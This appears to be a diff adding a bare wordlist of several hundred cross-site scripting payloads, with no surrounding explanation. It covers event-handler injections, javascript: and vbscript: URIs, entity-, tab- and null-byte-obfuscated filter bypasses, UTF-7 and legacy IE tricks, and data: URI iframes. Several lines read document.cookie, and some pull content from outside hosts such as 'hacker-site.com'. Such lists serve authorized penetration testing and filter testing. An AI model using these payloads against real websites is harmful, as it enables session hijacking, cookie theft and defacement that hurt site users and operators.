+<form><a href="javascript:\u0061lert&#x28;1&#x29;"></script><img/*/src="&colon;prompt&#x28;1&#x29;"/*/onerror='eval(src)'>
+<form><button formaction=javascript&colon;confirm()>
+<form><button formaction="javascript:confirm(123)">crosssitespt
+<form><button formaction="javascript:confirm(XSS)">
+<form><button formaction="javascript:javascript:confirm()">
+<form id="test" /><button form="test" formaction="javascript:confirm(123)">
+<form id="test" /><button form="test" formaction="javascript:javascript:confirm()">
+<form id=test onforminput=javascript:confirm()><input></form><button form=test onformchange=javascript:confirm()>
+<form><iframe &#09;&#10;&#11; src="javascript&#58;confirm()"&#11;&#10;&#09;;>
+<form><isindex formaction="javascript&colon;confirm(1)"
+<form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>
+<FRAMESET><FRAME SRC="javascript:confirm();"></FRAMESET>
+<FRAMESET><FRAME SRC=\"javascript:confirm();\"></FRAMESET>
+<;FRAMESET>;<;FRAME SRC=";javascript:confirm(';XSS';);";>;<;/FRAMESET>;
+<FRAMESET><FRAME SRC="javascript:document.vulnerable=true;"></frameset>
+<FRAMESET><FRAME SRC="javascript:javascript:confirm();"></FRAMESET>
+<frameset onBlur frameset onBlur="javascript:javascript:confirm()"></frameset onBlur>
+<frameset onFocus frameset onFocus="javascript:javascript:confirm()"></frameset onFocus>
+<frameset onload=confirm(123)>
+<frameset onload=javascript:confirm()>
+<frameset onload=javascript:javascript:confirm()></frameset>
+<frameset onScroll frameset onScroll="javascript:javascript:confirm()"></frameset onScroll>
+g'"></IFRAME>Hover the cursor to the LEFT of this Message</h1>&ParamHeight=250
+<h1><font color=blue>hellox worldss</h1>
+"><h1><IFRAME SRC="javascript:confirm();"></IFRAME>">123</h1>
+"><h1><IFRAME SRC=# onmouseover="confirm(document.cookie)"></IFRAME>123</h1>
+><h1><IFRAME width="420" height="315" frameborder="0" onmouseover="document.location.href='https://www.google.com/channel/UC9Qa_gXarSmObPX3ooIQZr
+"><h1><iframe width="420" height="315" src="http://www.google.com/embed/sxvccpasgTE" frameborder="0" allowfullscreen></iframe>123</h1>
+"><h1><IFRAME width="420" height="315" SRC="http://www.google.com/embed/sxvccpasgTE" frameborder="0" onmouseover="confirm(document.cookie)"></IFRAME>123</h1>
+<head><base href="javascript://"></head><body><a href="/. /,javascript:confirm()//#">XXX</a></body>
+ <HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-confirm();+ADw-/SCRIPT+AD4-
+<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-confirm();+ADw-/SCRIPT+AD4-
+<;HEAD>;<;META HTTP-EQUIV=";CONTENT-TYPE"; CONTENT=";text/html; charset=UTF-7";>; <;/HEAD>;+ADw-SCRIPT+AD4-confirm(';XSS';);+ADw-/SCRIPT+AD4-
+<head><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-document.vulnerable=true;+ADw-/SCRIPT+AD4-
+<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-%(payload)s;+ADw-/SCRIPT+AD4-
+</html>
+<;HTML>;<;BODY>;
+<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;confirm(&quot;XSS&quot;)&lt;/SCRIPT&gt;"></BODY></HTML>
+<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;javascript:confirm()&lt;/SCRIPT&gt;"></BODY></HTML>
+<html><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>document.vulnerable=true</SCRIPT>"></BODY></html>
+<html><noalert><noscript>(123)</noscript><script>(123)</script>
+<html onMouseDown html onMouseDown="javascript:javascript:confirm()"></html onMouseDown>
+<html onMouseEnter html onMouseEnter="javascript:parent.javascript:confirm()"></html onMouseEnter>
+<html onMouseLeave html onMouseLeave="javascript:javascript:confirm()"></html onMouseLeave>
+<html onmousemove html onmousemove="javascript:javascript:confirm()"></html onmousemove>
+<html onMouseMove html onMouseMove="javascript:javascript:confirm()"></html onMouseMove>
+<html onMouseOut html onMouseOut="javascript:javascript:confirm()"></html onMouseOut>
+<html onmouseover html onmouseover="javascript:javascript:confirm()"></html onmouseover>
+<html onMouseOver html onMouseOver="javascript:javascript:confirm()"></html onMouseOver>
+<html onMouseUp html onMouseUp="javascript:javascript:confirm()"></html onMouseUp>
+<html onMouseWheel html onMouseWheel="javascript:javascript:confirm()"></html onMouseWheel>
+<;HTML xmlns:xss>;
+<HTML xmlns:xss><?import namespace="1" implementation="%(htc)s"><xss:xss>XSS</xss:xss></HTML>""","XML namespace."),("""<XML ID="1"><I><B>&lt;IMG SRC="javas<!-- -->cript:javascript:confirm()"&gt;</B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
+<HTML xmlns:xss><?import namespace="1" implementation="http://www.google.com/xss.htc"><xss:xss>XSS</xss:xss></html>
+http://www.google<script .com>confirm(document.location)</script
+http://www.<script>confirm()</script .com
+<;!--[if gte IE 4]>;           
+<!--[if gte IE 4]><SCRIPT>confirm();</SCRIPT><![endif]-->
+<!--[if gte IE 4]><SCRIPT>document.vulnerable=true;</SCRIPT><![endif]-->
+<!--[if gte IE 4]><SCRIPT>javascript:confirm();</SCRIPT><![endif]-->
+<!--[if<img src=x onerror=javascript:confirm()//]> -->
+<iframe/%00/ src=javaSCRIPT&colon;confirm()
+<iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>
+<iframe onbeforeload iframe onbeforeload="javascript:javascript:confirm()"></iframe onbeforeload>
+<iframe onload iframe onload="javascript:javascript:confirm()"></iframe onload>
+<iframe onLoad iframe onLoad="javascript:javascript:confirm()"></iframe onLoad>
+<iframe/onreadystatechange=confirm()
+<iframe onReadyStateChange iframe onReadyStateChange="javascript:javascript:confirm()"></iframe onReadyStateChange>
+<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>
+<iframe<?php echo chr(11)?> onload=confirm()></iframe>
+"></iframe><script>confirm(123)</script>
+"></iframe><script>confirm();</script><iframe frameborder="0%EF%BB%BF
+<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
+<iframe/src="data:text/html,<svg &#111;&#110;load=confirm()>">
+<iframe/src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">
+<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>
+<iframe srcdoc="&LT;iframe&sol;srcdoc=&amp;lt;img&sol;src=&amp;apos;&amp;apos;onerror=javascript:confirm()&amp;gt;>">
+<iframe src=http://google.com/scriptlet.html <
+<IFRAME SRC=”http://hacker-site.com/xss.html”>
+<iframe src=http://www.google.com/scriptlet.html <
+<;IFRAME SRC=http://www.google.com/scriptlet.html <;
+/*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1) /*iframe/src*/>
+<iframe src iframe src="javascript:javascript:confirm()"></iframe src>
+<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
+<iframe// src=javaSCRIPT&colon;confirm()
+<;IFRAME SRC=";javascript:confirm();";>;<;/IFRAME>;
+<IFRAME SRC="javascript:confirm();"></IFRAME>
+<iframe src="javascript:confirm();"></iframe><marquee><h1>XSS by xss</h1></marquee>
+<iframe src="javascript:document.vulnerable=true; <
+<IFRAME SRC="javascript:document.vulnerable=true;"></iframe>
+<IFRAME SRC="javascript:javascript:confirm();"></IFRAME>
+<iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe>
+<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
+<iframe/src \/\/onload = prompt(1)
+<IFRAME SRC=# onmouseover="confirm()"></IFRAME>
+<iframe src=%(scriptlet)s <
+<iframe  src="&Tab;javascript:prompt(1)&Tab;">
+<iframe src="vbscript:document.vulnerable=true;">
+<iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
+<iframe style="xg-p:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
+<IFRAME width="420" height="315" frameborder="0" onload="confirm(document.cookie)"></IFRAME>
+<iframe xmlns="#" src="javascript:confirm()"></iframe>
+<!--[if]><script>javascript:confirm()</script -->
+<image src=1 href=1 onerror="javascript:confirm()"></image>
+<image src="javascript:confirm()">
+<image src/onerror=prompt(8)>
+<image/src/onerror=prompt(8)>
+<image src =q onerror=prompt(8)>
+<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>
+>"'><img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;confirm(%26quot;%26%23x20;XSS%26%23x20;Test%26%23x20;Successful%26quot;)>
+<img[a][b][c]src[d]=x[e]onerror=[f]"confirm()">
+<IMG DYNSRC="javascript:confirm()">
+<IMG DYNSRC=\"javascript:confirm()\">
+<;IMG DYNSRC=";javascript:confirm(';XSS';);";>;
+<img dynsrc="javascript:document.vulnerable=true;">
+<img DYNSRC="javascript:document.vulnerable=true;">
+<IMG DYNSRC="javascript:javascript:confirm()">
+<IMG LOWSRC="javascript:confirm()">
+<IMG LOWSRC=\"javascript:confirm()\">
+<;IMG LOWSRC=";javascript:confirm(';XSS';);";>;
+<img LOWSRC="javascript:document.vulnerable=true;">
+<IMG LOWSRC="javascript:javascript:confirm()">
+"/><img/onerror=\x09javascript:confirm()\x09src=xxx:x />
+"/><img/onerror=\x0Ajavascript:confirm()\x0Asrc=xxx:x />
+"/><img/onerror=\x0Bjavascript:confirm()\x0Bsrc=xxx:x />
+"/><img/onerror=\x0Cjavascript:confirm()\x0Csrc=xxx:x />
+"/><img/onerror=\x0Djavascript:confirm()\x0Dsrc=xxx:x />
+"/><img/onerror=\x20javascript:confirm()\x20src=xxx:x />
+"/><img/onerror=\x22javascript:confirm()\x22src=xxx:x />
+"/><img/onerror=\x27javascript:confirm()\x27src=xxx:x />
+"/><img/onerror=\x60javascript:confirm()\x60src=xxx:x />
+<IMG onmouseover="confirm()">
+<;IMG RC=&;#0000106&;#0000097&;#0000118&;#0000097&;#0000115&;#0000099&;#0000114&;#0000105&;#0000112&;#0000116&;#0000058&;#0000097&;#0000108&;#0000101&;#0000114&;#0000116&;#0000040&;#0000039&;#0000088&;#0000083&;#0000083&;#0000039&;#0000041>;
+<;IMG RC=&;#106;&;#97;&;#118;&;#97;&;#115;&;#99;&;#114;&;#105;&;#112;&;#116;&;#58;&;#97;&;#108;&;#101;&;#114;&;#116;&;#40;&;#39;&;#88;&;#83;&;#83;&;#39;&;#41;>;
+<;IMG ";";";>;<;SCRIPT>;confirm()<;/SCRIPT>;";>;
+<IMG """><SCRIPT>confirm()</SCRIPT>">
+<IMG “””><SCRIPT>confirm()</SCRIPT>”>
+<img """><script>confirm()</script><marquee><h1></h1></marquee>
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+<IMGSRC=&#0000106&#0000097&<WBR>#0000118&#0000097&#0000115&<WBR>#0000099&#0000114&#0000105&<WBR>#0000112&#0000116&#0000058&<WBR>#0000097&#0000108&#0000101&<WBR>#0000114&#0000116&#0000040&<WBR>#0000039&#0000088&#0000083&<WBR>#0000083&#0000039&#0000041>    
+<img src=`%00`&NewLine; onerror=confirm()&NewLine;
+<img/src=`%00` onerror=this.onerror=confirm(1)
+<img/src=`%00` onerror=this.onerror=confirm(1) 
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+<IMGSRC=&#106;&#97;&#118;&#97;&<WBR>#115;&#99;&#114;&#105;&#112;&<WBR>#116;&#58;&#97;&#108;&#101;&<WBR>#114;&#116;&#40;&#39;&#88;&#83<WBR>;&#83;&#39;&#41>
+<;IMG SRC="; &;#14;  javascript:confirm();";>;
+<IMG SRC=" &#14;  javascript:confirm();">
+<img SRC=" &#14; javascript:document.vulnerable=true;">
+<img src=1 href=1 onerror="javascript:confirm()"></img>
+<img/src=@&#32;&#13; onerror = prompt()
+<img src=asdf onerror=confirm(document.cookie)>
+<img src="blah"onmouseover="document.vulnerable=true;">
+<img src="blah>" onmouseover="document.vulnerable=true;">
+<img src=&{document.vulnerable=true;};>
+<img src=foo.png onerror=confirm() />
+<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1)
+<;IMG SRC=";http://www.google.com/aa.js";>;
+<IMG SRC="http://www.google.com/aa.js">
+<!--<img src="--><img src=x onerror=confirm()//">
+<![><img src="]><img src=x onerror=confirm()//">
+<!--<img src="--><img src=x onerror=confirm(123)//">
+<!--<img src="--><img src=x onerror=javascript:confirm()//">
+<![><img src="]><img src=x onerror=javascript:confirm()//">
+<img src ?itworksonchrome?\/onerror = confirm()
+<img src="javascript:confirm()">
+<img src="javascript:confirm();">
+<img src=javascript:confirm()>
+<;IMG SRC=";javascript:confirm()";
+<;IMG SRC=";javascript:confirm();";>;
+<;IMG SRC=`javascript:confirm()`>;
+<;IMG SRC=javascript:confirm()>;
+<IMG SRC="jav	ascript:confirm();">
+<IMG SRC="jav ascript:confirm();">
+<IMG SRC="javascript:confirm()"
+<IMG SRC="javascript:confirm();">
+<IMG SRC=&{javascript:confirm();};>
+<IMG SRC=`javascript:confirm()`>
+<IMG SRC=”jav ascript:confirm();”>
+<IMG SRC=”javascript:confirm();”>
+<IMG SRC=”javascript:confirm()”
+<IMG SRC=javascript:confirm()>
+<IMG SRC=javascript:confirm()>      
+<IMG SRC=javascript:confirm()>       
+<IMG SRC=jAVasCrIPt:confirm()>
+<;IMG SRC=JaVaScRiPt:confirm()>;
+<IMG SRC=JaVaScRiPt:confirm()>
+<img src="javascript:document.vulnerable=true;">
+<img SRC="jav ascript:document.vulnerable=true;">
+<img SRC="javascript:document.vulnerable=true;"
+<img SRC="javascript:document.vulnerable=true;">
+<IMG SRC="jav    ascript:javascript:confirm();">
+<IMG SRC="jav ascript:javascript:confirm();">
+<IMG SRC="javascript:javascript:confirm()"
+<IMG SRC="javascript:javascript:confirm();">
+<IMG SRC=`javascript:javascript:confirm()`>
+<IMG SRC=javascript:javascript:confirm()>
+<IMG SRC=javascrscriptipt:confirm()>
+<;IMG SRC=";jav&#x09;ascript:confirm();";>;
+<;IMG SRC=";jav&;#x09;ascript:confirm();";>;
+<IMG SRC="jav&#x09;ascript:confirm();">
+<IMG SRC=\"jav&#x09;ascript:confirm();\">
+<IMG SRC=”jav&#x09;ascript:confirm();”>
+<;IMG SRC=";jav&;#x0A;ascript:confirm();";>;
+<IMG SRC="jav&#x0A;ascript:confirm();">
+<IMG SRC=\"jav&#x0A;ascript:confirm();\">
+<;IMG SRC=";jav&;#x0D;ascript:confirm();";>;
+<IMG SRC="jav&#x0D;ascript:confirm();">
+<IMG SRC=\"jav&#x0D;ascript:confirm();\">
+<;IMG SRC=";livescript:[code]";>;
+<IMG SRC="livescript:[code]">
+<img src="livescript:document.vulnerable=true;">
+<;IMG SRC=";mocha:[code]";>;
+<img src="mocha:document.vulnerable=true;">
+#"><img src=M onerror=confirm();>
+<img src=``&NewLine; onerror=confirm()&NewLine;
+<img src onerror /" '"= alt=javascript:confirm()//">
+<--`<img/src=` onerror=confirm()> --!>
+<IMG SRC=/ onerror="confirm()"></img>
+<img src/onerror=prompt(8)>
+<img/src/onerror=prompt(8)>
+<img/src=`` onerror=this.onerror=confirm(1) 
+<img src=# onerror\x3D"javascript:confirm()" >
+<IMG SRC= onmouseover="confirm(1)">
+<IMG SRC=# onmouseover="confirm(1)">
+<img src =q onerror=prompt(8)>
+<img src="/" =_=" title="onerror='prompt(1)'">
+<img SRC='vbscript:document.vulnerable=true;'>
+<;IMG SRC=';vbscript:msgbox(1)';>;
+<IMG SRC='vbscript:msgbox(1)'>
+<img src\x00=x onerror="javascript:confirm()">
+<img src\x09=x onerror="javascript:confirm()">
+<img src\x10=x onerror="javascript:confirm()">
+<img src\x11=x onerror="javascript:confirm()">
+<img src\x12=x onerror="javascript:confirm()">
+<img src\x13=x onerror="javascript:confirm()">
+`"'><img src='#\x27 onerror=javascript:confirm()>
+<img src\x32=x onerror="javascript:confirm()">
+<img src\x47=x onerror="javascript:confirm()">
+<IMGSRC=&#x6A&#x61&#x76&#x61&#x73&<WBR>#x63&#x72&#x69&#x70&#x74&#x3A&<WBR>#x61&#x6C&#x65&#x72&#x74&#x28&<WBR>#x27&#x58&#x53&#x53&#x27&#x29>
+<;IMG SRC=&;#x6A&;#x61&;#x76&;#x61&;#x73&;#x63&;#x72&;#x69&;#x70&;#x74&;#x3A&;#x61&;#x6C&;#x65&;#x72&;#x74&;#x28&;#x27&;#x58&;#x53&;#x53&;#x27&;#x29>;
+<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+<IMG SRC=x onabort="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onafterprint="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onbeforeprint="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onbeforeunload="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onblur="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x oncanplay="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x oncanplaythrough="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onchange="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onclick="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x oncontextmenu="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x oncopy="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x oncuechange="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x oncut="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x ondblclick="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x ondrag="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x ondragend="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x ondragenter="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x ondragleave="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x ondragover="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x ondragstart="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x ondrop="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x ondurationchange="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onemptied="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onended="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onerror="confirm(String.fromCharCode(88,83,83))">
+"><img src=x onerror=javascript:confirm()>
+"><img src=x onerror=javascript:confirm("1")>
+"><img src=x onerror=javascript:confirm('1')>
+"><img src=x onerror=javascript:confirm(("1"))>
+"><img src=x onerror=javascript:confirm(('1'))>
+"><img src=x onerror=javascript:confirm((`1`))>
+"><img src=x onerror=javascript:confirm(`1`)>
+"><img src=x onerror=javascript:confirm("A")>
+"><img src=x onerror=javascript:confirm('A')>
+"><img src=x onerror=javascript:confirm(("A"))>
+"><img src=x onerror=javascript:confirm(('A'))>
+"><img src=x onerror=javascript:confirm((`A`))>
+"><img src=x onerror=javascript:confirm((A))>
+"><img src=x onerror=javascript:confirm(`A`)>
+"><img src=x onerror=javascript:confirm(A)>
+"><img src=x onerror=window.open('https://www.google.com/');>
+<img src=x onerror=\x00"javascript:confirm()">
+<img src=x onerror=\x09"javascript:confirm()">
+<img src=x onerror=\x10"javascript:confirm()">
+<img src=x onerror=\x11"javascript:confirm()">
+<img src=x onerror=\x12"javascript:confirm()">
+<img src=x onerror=\x32"javascript:confirm()">
+<IMG SRC=x onhashchange="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x oninput="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x oninvalid="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onkeydown="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onkeypress="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onkeyup="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onload="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onloadeddata="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onloadedmetadata="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onloadstart="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onmessage="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onmousedown="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onmousemove="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onmouseout="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onmouseover="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onmouseup="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onmousewheel="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onoffline="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x ononline="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onpagehide="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onpageshow="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onpaste="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onpause="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onplay="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onplaying="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onpopstate="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onprogress="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onratechange="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onreset="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onresize="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onscroll="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onsearch="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onseeked="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onseeking="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onselect="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onshow="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onstalled="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onstorage="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onsubmit="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onsuspend="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x ontimeupdate="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x ontoggle="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onunload="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onvolumechange="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onwaiting="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onwheel="confirm(String.fromCharCode(88,83,83))">
+<img src="x` `<script>javascript:confirm()</script>"` `>
+<img src=xss onerror=confirm()>
+<img src=x\x09onerror="javascript:confirm()">
+<img src=x\x10onerror="javascript:confirm()">
+<img src=x\x11onerror="javascript:confirm()">
+<img src=x\x12onerror="javascript:confirm()">
+<img src=x\x13onerror="javascript:confirm()">
+<img src=`xx:xx`onerror=confirm()>
+--><!-- ---> <img src=xxx:x onerror=javascript:confirm()> -->
+`"'><img src=xxx:x onerror\x00=javascript:confirm()>
+`"'><img src=xxx:x onerror\x09=javascript:confirm()>
+`"'><img src=xxx:x onerror\x0A=javascript:confirm()>
+`"'><img src=xxx:x onerror\x0B=javascript:confirm()>
+`"'><img src=xxx:x onerror\x0C=javascript:confirm()>
+`"'><img src=xxx:x onerror\x0D=javascript:confirm()>
+`"'><img src=xxx:x onerror\x20=javascript:confirm()>
+`"'><img src=xxx:x \x00onerror=javascript:confirm()>
+`"'><img src=xxx:x \x09onerror=javascript:confirm()>
+`"'><img src=xxx:x \x0Aonerror=javascript:confirm()>
+`"'><img src=xxx:x \x0Bonerror=javascript:confirm()>
+`"'><img src=xxx:x \x0Conerror=javascript:confirm()>
+`"'><img src=xxx:x \x0Donerror=javascript:confirm()>
+`"'><img src=xxx:x \x20onerror=javascript:confirm()>
+`"'><img src=xxx:x \x22onerror=javascript:confirm()>
+`"'><img src=xxx:x \x27onerror=javascript:confirm()>
+`"'><img src=xxx:x \x2Fonerror=javascript:confirm()>
+<IMG STYLE="xss:expr/*XSS*/ession(confirm())">
+<;IMG STYLE=";xss:expr/*XSS*/ession(confirm(1))";>;
+<img STYLE="xss:expr/*XSS*/ession(document.vulnerable=true)">
+<IMG STYLE="xss:expr/*XSS*/ession(javascript:confirm())">
+<img \x00src=x onerror="confirm()">
+<img \x00src=x onerror="javascript:confirm()">
+<;IMG&#x0D;SRC&#x0D;=&#x0D;";&#x0D;j&#x0D;a&#x0D;v&#x0D;a&#x0D;s&#x0D;c&#x0D;r&#x0D;i&#x0D;p&#x0D;t&#x0D;:&#x0D;a&#x0D;l&#x0D;e&#x0D;r&#x0D;t&#x0D;&#x0D;';&#x0D;X&#x0D;S&#x0D;S&#x0D;';&#x0D;)&#x0D;";&#x0D;>;&#x0D;
+<img\x10src=x onerror="javascript:confirm()">
+<img \x11src=x onerror="javascript:confirm()">
+<img\x11src=x onerror="javascript:confirm()">
+<img \x12src=x onerror="javascript:confirm()">
+<img\x13src=x onerror="javascript:confirm()">
+<img\x32src=x onerror="javascript:confirm()">
+<img \x34src=x onerror="javascript:confirm()">
+<img \x39src=x onerror="javascript:confirm()">
+<img \x47src=x onerror="javascript:confirm()">
+<img\x47src=x onerror="javascript:confirm()">
+<input onblur=javascript:confirm() autofocus><input autofocus>
+<input onblur=write(XSS) autofocus><input autofocus>
+<input onfocus=javascript:confirm() autofocus>
+<input onfocus=write(XSS) autofocus>
+<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+<INPUT TYPE="BUTTON" action="confirm()"/>
+<input type="image" dynsrc="javascript:document.vulnerable=true;">
+<INPUT TYPE="IMAGE" SRC="javascript:confirm();">
+<;INPUT TYPE=";IMAGE"; SRC=";javascript:confirm(1);";>;
+<INPUT TYPE=”IMAGE” SRC=”javascript:confirm(1);”>
+<input TYPE="IMAGE" SRC="javascript:document.vulnerable=true;">
+<INPUT TYPE="IMAGE" SRC="javascript:javascript:confirm();">
+<input type="text" value=`` <div/onmouseover='confirm()'>X</div>
+<input value=<><iframe/src=javascript:confirm(1)
